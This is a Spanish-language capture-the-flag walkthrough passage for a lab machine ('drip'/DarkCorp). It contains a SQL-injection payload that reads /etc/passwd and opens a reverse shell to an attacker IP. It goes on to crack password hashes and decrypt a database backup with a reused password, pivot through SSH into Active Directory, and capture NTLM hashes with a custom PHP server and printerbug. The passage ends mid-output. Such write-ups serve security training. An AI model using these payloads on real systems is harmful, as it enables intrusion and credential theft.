Vemos que esta funcionando, si probamos a exfiltrar informacion no veremos nada interesante, por lo que vamos a probar a realizar un `reverse shell` de esta forma.

Ya que si probamos a leer el archivo `/etc/passwd`:

```mysql
username; SELECT pg_read_file('/etc/passwd');--
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
postfix:x:103:111::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:104:113:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:105:114:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
vmail:x:5000:5000::/home/vmail:/usr/bin/nologin
avahi:x:106:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```

Vemos que funciona (Con esto identificamos que esta corriendo en un `Linux`, por lo que la `shell` la podemos hacer con `bash`), por lo que vamos a meter el siguiente `payload` de `reverse shell` que es el que me ha funcionado.

Pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el `payload`...

```mysql
'diseo';DO $$ DECLARE cmd text; BEGIN cmd := CHR(67) || 'OPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"'''; EXECUTE cmd; END $$;
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.220] from (UNKNOWN) [10.10.11.54] 53914
bash: cannot set terminal process group (40251): Inappropriate ioctl for device
bash: no job control in this shell
postgres@drip:/var/lib/postgresql/15/main$ whoami
whoami
postgres
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell` (`TTY`).

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user victor

Si buscamos en las `DDBBs` de `postgresql` no veremos nada interesante, pero despues de una busqueda bastante intensiva descubrimos un directorio:

```shell
cd /var/log/postgresql
```

En el que aloja bastantes comprimidos `.gz`, vamos a utilizar una utilidad de `cat` para leer dichos comprimidos y filtrar por el nombre de usuario `ebelford`, ya que de otros usuarios no veremos nada.

```shell
zcat *.gz | grep ebelford
```

Info:

```
2025-02-03 11:05:04.886 MST [5952] postgres@dripmail STATEMENT:  UPDATE Users SET password = 8bbd7f88841b4223ae63c8848969be86 WHERE username = ebelford;
```

Veremos que ha nivel de `DDBB` se establecio la contraseña de dicho usuario con ese `hash MD5` aparentemente, vamos a probar a `crackearlo` en la siguiente pagina.

URL = [Pagina Hashes Decrypt MD5](https://hashes.com/en/decrypt/hash)

Como resultado veremos que lo consiguio.

```
8bbd7f88841b4223ae63c8848969be86:ThePlague61780
```

Ahora si probamos dicha contraseña con el usuario `ebelford` en `Linux`.

```shell
su ebelford
```

Metemos como contraseña `ThePlague61780`...

```
ebelford@drip:/var/log/postgresql$ whoami
ebelford
```

Veremos que funciona, pero no veremos nada interesante con este usuario, por lo que vamos a salirnos del mismo, estando con el usuario de `postgres` veremos la siguiente ruta interesante:

```shell
cd /var/backups/postgres/
```

Info:

```
total 12
drwx------ 2 postgres postgres 4096 Feb  5  2025 .
drwxr-xr-x 3 root     root     4096 Oct 22 00:00 ..
-rw-r--r-- 1 postgres postgres 1784 Feb  5  2025 dev-dripmail.old.sql.gpg
```

Vemos que esta codificado por una clave `GPG` si no sabemos la clave no podremos ver su contenido, por lo que buscando un poco si leemos el siguiente archivo.

```shell
cat /var/www/html/dashboard/.env
```

Info:

```
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

Vemos informacion muy interesante entre ella un `DB_PASS`, vamos a probar si dicha contraseña sirve para decodificar el archivo `GPG`.

```shell
cd /var/backups/postgres
gpg --decrypt dev-dripmail.old.sql.gpg
```

Metemos como contraseña `2Qa2SsBkQvsc`...

```
gpg: encrypted with 3072-bit RSA key, ID 1112336661D8BC1F, created 2025-01-08
      "postgres <postgres@drip.darkcorp.htb>"
--
-- PostgreSQL database dump
--

-- Dumped from database version 15.10 (Debian 15.10-0+deb12u1)
-- Dumped by pg_dump version 15.10 (Debian 15.10-0+deb12u1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: Admins; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."Admins" (
    id integer NOT NULL,
    username character varying(80),
    password character varying(80),
    email character varying(80)
);


ALTER TABLE public."Admins" OWNER TO postgres;

--
-- Name: Admins_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public."Admins_id_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public."Admins_id_seq" OWNER TO postgres;

--
-- Name: Admins_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public."Admins_id_seq" OWNED BY public."Admins".id;


--
-- Name: Users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."Users" (
    id integer NOT NULL,
    username character varying(80),
    password character varying(80),
    email character varying(80),
    host_header character varying(255),
    ip_address character varying(80)
);


ALTER TABLE public."Users" OWNER TO postgres;

--
-- Name: Users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public."Users_id_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public."Users_id_seq" OWNER TO postgres;

--
-- Name: Users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public."Users_id_seq" OWNED BY public."Users".id;


--
-- Name: Admins id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Admins" ALTER COLUMN id SET DEFAULT nextval('public."Admins_id_seq"'::regclass);


--
-- Name: Users id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Users" ALTER COLUMN id SET DEFAULT nextval('public."Users_id_seq"'::regclass);


--
-- Data for Name: Admins; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Admins" (id, username, password, email) FROM stdin;
1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
\.


--
-- Data for Name: Users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
5001    support d9b9ecbf29db8054b21f303072b37c4e        support@drip.htb        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0        10.0.50.10
5002    bcase   1eace53df87b9a15a37fdc11da2d298d        bcase@drip.htb  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0        10.0.50.10
5003    ebelford        0cebd84e066fd988e89083879e88c5f9        ebelford@drip.htb       Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0        10.0.50.10
\.


--
-- Name: Admins_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."Admins_id_seq"', 1, true);


--
-- Name: Users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."Users_id_seq"', 5003, true);


--
-- Name: Admins Admins_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Admins"
    ADD CONSTRAINT "Admins_pkey" PRIMARY KEY (id);


--
-- Name: Users Users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Users"
    ADD CONSTRAINT "Users_pkey" PRIMARY KEY (id);


--
-- Name: TABLE "Admins"; Type: ACL; Schema: public; Owner: postgres
--

GRANT SELECT ON TABLE public."Admins" TO dripmail_dba;


--
-- Name: SEQUENCE "Admins_id_seq"; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON SEQUENCE public."Admins_id_seq" TO dripmail_dba;


--
-- Name: TABLE "Users"; Type: ACL; Schema: public; Owner: postgres
--

GRANT SELECT ON TABLE public."Users" TO dripmail_dba;


--
-- Name: SEQUENCE "Users_id_seq"; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON SEQUENCE public."Users_id_seq" TO dripmail_dba;


--
-- PostgreSQL database dump complete
```

Veremos que ha funcionado y obtendremos varios `hashes` de usuarios, pero el que mas nos llama la atencion es el del usuario `victor`.

```
cac1c7b0e7008d67b6db40c03e76b9c0 victor.r@drip.htb
```

Ya que tiene toda la pinta de que puede ser un usuario a nivel de dominio de `windows`.

Si probamos a `crackearlo` en la pagina de `Hashes`...

```
cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
```

Vemos que ha funcionado, pero otra cosa interesante es que si leemos el archivo `hosts` veremos estas lineas:

```
172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
```

Vemos que para la `IP` `172.16.20.3` se esta utilizando el dominio `drip.darkcorp.htb`, por lo que podria utilizan la herramienta de `proxychains` para poder comunicarnos de forma externa con la `IP` atraves del dominio.

Vamos a redireccionar un puerto que actue como `proxy inverso` de esta forma con `SSH`:

```shell
ssh ebelford@drip.htb -D 1080
```

Metemos como contraseña `ThePlague61780`...

Info:

```
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
Last login: Wed Oct 22 05:24:55 2025 from 127.0.0.1
ebelford@drip:~$
```

Con esto veremos que funciono, ahora si hacemos `ss -tuln` en nuestra maquina atacante veremos esto:

```shell
ss -tuln | grep "1080"
```

Info:

```
tcp   LISTEN 0      128             127.0.0.1:1080       0.0.0.0:*   
tcp   LISTEN 0      128                 [::1]:1080          [::]:*
```

Vamos a configurar nuestro archivo de `proxychains4` para que apunte al puerto redireccionado de esta forma:

```shell
nano /etc/proxychains4.conf
```

Info:

```shell
# En la parte de socks4 pondremos lo siguiente:
socks4 127.0.0.1 1080
```

Lo guardamos y si probamos con las credenciales del usuario `victor` que obtuvimos anteriormente en el `DC` al cual ahora si tenemos conexion:

```shell
proxychains netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --shares
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB         172.16.20.1     445    DC-01            [*] Enumerated shares
SMB         172.16.20.1     445    DC-01            Share           Permissions     Remark
SMB         172.16.20.1     445    DC-01            -----           -----------     ------
SMB         172.16.20.1     445    DC-01            ADMIN$                          Remote Admin
SMB         172.16.20.1     445    DC-01            C$                              Default share
SMB         172.16.20.1     445    DC-01            CertEnroll      READ            Active Directory Certificate Services share
SMB         172.16.20.1     445    DC-01            IPC$            READ            Remote IPC
SMB         172.16.20.1     445    DC-01            NETLOGON        READ            Logon server share 
SMB         172.16.20.1     445    DC-01            SYSVOL          READ            Logon server share
```

Veremos que esta funcionando, por lo que vamos a descargarnos un `ZIP` para `BloodHound` y analizar un poco todo el `DC`.

```shell
apt install cargo
cargo install rusthound
export PATH="$HOME/.cargo/bin:$PATH"
proxychains rusthound --domain darkcorp.htb -u victor.r -p 'victor1gustavo@#' --zip
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
---------------------------------------------------
Initializing RustHound at 11:52:33 on 10/22/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-10-22T18:52:33Z INFO  rusthound] Verbosity level: Info
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  darkcorp.htb:389  ...  OK
[2025-10-22T18:52:33Z INFO  rusthound::ldap] Connected to DARKCORP.HTB Active Directory!
[2025-10-22T18:52:33Z INFO  rusthound::ldap] Starting data collection...
[2025-10-22T18:52:35Z INFO  rusthound::ldap] All data collected for NamingContext DC=darkcorp,DC=htb
[2025-10-22T18:52:35Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-10-22T18:52:35Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-10-22T18:52:35Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-10-22T18:52:35Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 13 users parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 62 groups parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 3 computers parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 4 ous parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 3 gpos parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-10-22T18:52:35Z INFO  rusthound::json::maker] .//20251022115235_darkcorp-htb_rusthound.zip created!

RustHound Enumeration Completed at 11:52:35 on 10/22/25! Happy Graphing!
```

Esto nos volcara un `.zip` el cual tendremos que cargar en `BloodHound`.

### BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `victor.r` a ver que tiene.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 135205.png" alt=""><figcaption></figcaption></figure>

Veremos algunas cosas interesantes, pero de momento se quedan ahi, si configuramos nuestro `proxy web` con `FoxyProxy` de esta forma:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 135652.png" alt=""><figcaption></figcaption></figure>

Vamos acceder al siguiente puerto que vemos interesante si inspeccionamos desde la maquina victima.

```
URL = http://172.16.20.2:5000/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 135812.png" alt=""><figcaption></figcaption></figure>

Vemos que nos pide una autenticacion, probaremos con las credenciales del usuario `victor.r`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 135921.png" alt=""><figcaption></figcaption></figure>

Vemos que han funcionado y aqui estamos viendo varios `DBs` por lo que se ve a parte de varias `WEBs` tambien, esto puede ser muy interesante tambien.

Si nos vamos a `Check Status`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 140234.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 140127.png" alt=""><figcaption></figcaption></figure>

Veremos que podremos configurar un puerto y dominio para ver si esta operativo o no, esto nos da una idea de que podriamos probar a capturar el `hash NTLM` gracias a esta peticion que se va a realizar, por lo que vamos a preparar todo.

## Captura Hash NTMLv2 (Intento)

Primero vamos a preparar un `socat` para que la respuesta que nos de la pagina se tunelize en nuestro puerto `80` de la maquina atacante (Este comando se ejecuta en la maquina `victima`).

Para ello nos tendremos que pasar el binario `socat`, vamos a realizar lo siguiente:

```shell
git clone https://github.com/andrew-d/static-binaries
cp static-binaries/binaries/linux/x86_64/socat .
python3 -m http.server 80
```

Desde la maquina victima:

```shell
cd /tmp
wget http://<IP_ATTACKER>/socat
chmod +x socat
./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:<IP_ATTACKER>:80
```

Despues de este proceso cerramos el puerto de `python3` antes de ejecutar el `socat`.

Dejaremos esta configuracion:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 140300.png" alt=""><figcaption></figcaption></figure>

O bien podremos lanzarlo con `curl` directamente utilizando `proxychains` de esta forma:

```shell
proxychains curl -v 'http://172.16.20.2:5000/status' \
  -H 'Content-Type: application/json' \
  --data-raw '{"protocol":"http","host":"drip.darkcorp.htb","port":8080}' \
  --ntlm -u 'victor.r:victor1gustavo@#'
```

Ahora antes de enviar nada, tendremos que ponernos a la escucha con el `responder`, tiene que tener habilitado el `HTTP = On` ya que sera nuestro puerto `80` para que capture dicho `hash` cuando se envie desde la pagina.

```shell
responder -I tun0 -wdv
```

Ahora si le damos al boton de `Check!` desde la pagina o enviamos el `curl`, esperamos un rato y si volvemos a donde tenemos a la escucha el `responder` veremos que no obtenemos nada, solamente solicitudes de peticiones, pero no el `hash`, despues de unos dias intentandolo y buscando informacion por lo que se ve hay un error con el `responder` actual y falla mucho, montandote una `web` de `apache2` con un `.php` fui capaz de capturar ese `hash` `NTLMv2` forzando el mismo, pero igualmente no nos servira de nada.

> index.php

```php
<?php
header('Content-Type: text/plain');

$log_file = '/var/www/html/ntlm_hashes.log';

// Headers
$headers = getallheaders();
$auth_header = $headers['Authorization'] ?? '';

function log_ntlm($data) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] " . json_encode($data) . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    return $log_entry;
}

// Si no hay Authorization, enviar desafío NTLM
if (empty($auth_header)) {
    header('HTTP/1.1 401 Unauthorized');
    header('WWW-Authenticate: NTLM');
    
    log_ntlm([
        'client_ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'action' => 'SENT_NTLM_CHALLENGE'
    ]);
    
    echo "NTLM Authentication Required";
    exit;
}

// Procesar NTLM
if (strpos($auth_header, 'NTLM ') === 0) {
    $ntlm_data = substr($auth_header, 5);
    $decoded = base64_decode($ntlm_data);
    
    // Determinar tipo de mensaje NTLM
    $message_type = ord($decoded[8]);
    
    $log_data = [
        'client_ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'message_type' => $message_type,
        'ntlm_data' => $ntlm_data
    ];
    
    if ($message_type == 1) {
        // Type 1: Negotiate - enviar challenge
        $log_data['action'] = 'NTLM_NEGOTIATE_RECEIVED';
        
        // Crear un challenge NTLM (simplificado)
        $challenge = "0123456789abcdef"; // 8-byte challenge
        $target_name = "DARKCORP";
        
        $type2_message = "NTLMSSP\x00" . // Signature
                        "\x02\x00\x00\x00" . // Type 2
                        "\x00\x00" . // Target name len
                        "\x00\x00" . // Target name max len
                        "\x00\x00\x00\x00" . // Target name offset
                        "\x01\x02\x81\x00" . // Flags
                        $challenge . // Challenge
                        "\x00\x00\x00\x00\x00\x00\x00\x00"; // Context
        
        header('HTTP/1.1 401 Unauthorized');
        header('WWW-Authenticate: NTLM ' . base64_encode($type2_message));
        
        echo "NTLM Challenge Sent";
        
    } elseif ($message_type == 3) {
        // Type 3: Authenticate - ¡HASH CAPTURADO!
        $log_data['action'] = 'NTLM_HASH_CAPTURED';
        $log_data['status'] = 'SUCCESS';
        
        // Extraer información del hash
        $lm_response_offset = unpack("V", substr($decoded, 16, 4))[1];
        $nt_response_offset = unpack("V", substr($decoded, 24, 4))[1];
        $domain_offset = unpack("V", substr($decoded, 28, 4))[1];
        $user_offset = unpack("V", substr($decoded, 36, 4))[1];
        
        $domain_len = unpack("v", substr($decoded, 30, 2))[1];
        $user_len = unpack("v", substr($decoded, 38, 2))[1];
        
        $domain = substr($decoded, $domain_offset, $domain_len);
        $user = substr($decoded, $user_offset, $user_len);
        
        $log_data['domain'] = $domain;
        $log_data['user'] = $user;
        $log_data['full_hash_b64'] = $ntlm_data;
        
        // Responder con éxito
        header('HTTP/1.1 200 OK');
        echo "🎯 NTLMv2 HASH CAPTURED! 🎯\n";
        echo "User: " . $user . "\n";
        echo "Domain: " . $domain . "\n";
        echo "Hash (Base64): " . $ntlm_data . "\n";
        echo "Saved to log file\n";
        
    } else {
        $log_data['action'] = 'UNKNOWN_NTLM_TYPE';
        header('HTTP/1.1 400 Bad Request');
        echo "Unknown NTLM message type";
    }
    
    log_ntlm($log_data);
    
} else {
    header('HTTP/1.1 400 Bad Request');
    echo "Unsupported authentication method";
}
?>
```

Habilitamos el servidor de `apache2` para poder recibir dicha peticion, ya que estamos realizando un `portforwarding` del puerto `8080` al `80` de la maquina atacante.

```shell
systemctl start apache2
```

Enviamos la peticion de autenticacion de esta forma:

```shell
proxychains curl -v 'http://172.16.20.2:5000/status' \
  -H 'Content-Type: application/json' \
  --data-raw '{"protocol":"http","host":"drip.darkcorp.htb","port":8080}' \
  --ntlm -u 'victor.r:victor1gustavo@#'
```

Ahora si leemos el `log` que deberia de haber dejado tras la autenticacion del mismo...

```shell
cat /var/www/html/ntlm_hashes.log
```

Info:

```
[2025-10-25 14:48:54] {"client_ip":"10.10.11.54","user_agent":"python-requests\/2.32.3","action":"SENT_NTLM_CHALLENGE"}
[2025-10-25 14:48:54] {"client_ip":"10.10.11.54","user_agent":"Mozilla\/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell\/5.1.20348.2110","action":"SENT_NTLM_CHALLENGE"}
[2025-10-25 14:48:54] {"client_ip":"10.10.11.54","user_agent":"Mozilla\/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell\/5.1.20348.2110","message_type":1,"ntlm_data":"TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAKAHxPAAAADw==","action":"NTLM_NEGOTIATE_RECEIVED"}
[2025-10-25 14:48:54] {"client_ip":"10.10.11.54","user_agent":"Mozilla\/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell\/5.1.20348.2110","message_type":3,"ntlm_data":"TlRMTVNTUAADAAAAGAAYAIIAAACsAKwAmgAAABAAEABYAAAADgAOAGgAAAAMAAwAdgAAAAAAAABGAQAABQKAAgoAfE8AAAAPreBXohQWuY61UjIe3iKQZmQAYQByAGsAYwBvAHIAcABzAHYAYwBfAGEAYwBjAFcARQBCAC0AMAAxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMuHt9JvcHXgvX3vmAPnUMABAQAAAAAAAHkvEsqERdwBMCWOKfz4i6IAAAAACAAwADAAAAAAAAAAAAAAAAAwAACw37ze7xdez6ukPULWGIdpPi9+84EuaIM486BiDjUieQoAEAAAAAAAAAAAAAAAAAAAAAAACQAsAEgAVABUAFAALwBkAHIAaQBwAC4AZABhAHIAawBjAG8AcgBwAC4AaAB0AGIAAAAAAAAAAAA=","action":"NTLM_HASH_CAPTURED","status":"SUCCESS","domain":"","user":"","full_hash_b64":"TlRMTVNTUAADAAAAGAAYAIIAAACsAKwAmgAAABAAEABYAAAADgAOAGgAAAAMAAwAdgAAAAAAAABGAQAABQKAAgoAfE8AAAAPreBXohQWuY61UjIe3iKQZmQAYQByAGsAYwBvAHIAcABzAHYAYwBfAGEAYwBjAFcARQBCAC0AMAAxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMuHt9JvcHXgvX3vmAPnUMABAQAAAAAAAHkvEsqERdwBMCWOKfz4i6IAAAAACAAwADAAAAAAAAAAAAAAAAAwAACw37ze7xdez6ukPULWGIdpPi9+84EuaIM486BiDjUieQoAEAAAAAAAAAAAAAAAAAAAAAAACQAsAEgAVABUAFAALwBkAHIAaQBwAC4AZABhAHIAawBjAG8AcgBwAC4AaAB0AGIAAAAAAAAAAAA="}
```

Veremos que capturamos un `hash` del usuario `svc_acc`, pero sin mas, no podremos hacer mucho con el.

Si probamos a realizar lo siguiente podremos obtener un `hash NTLMv2` del usuario `WEB-01$` de esta forma:

Primero nos pondremos a la escucha con `responder` de nuevo:

```shell
responder -I tun0 -wdv
```

En otra terminal tendremos que descargarnos un repo de `github` asi:

```shell
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx/
```

Hecho esto vamos a ejecutarlo de esta forma:

```shell
proxychains python3 printerbug.py 'darkcorp/victor.r':'victor1gustavo@#'@WEB-01.darkcorp.htb <IP_ATTACKER>
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
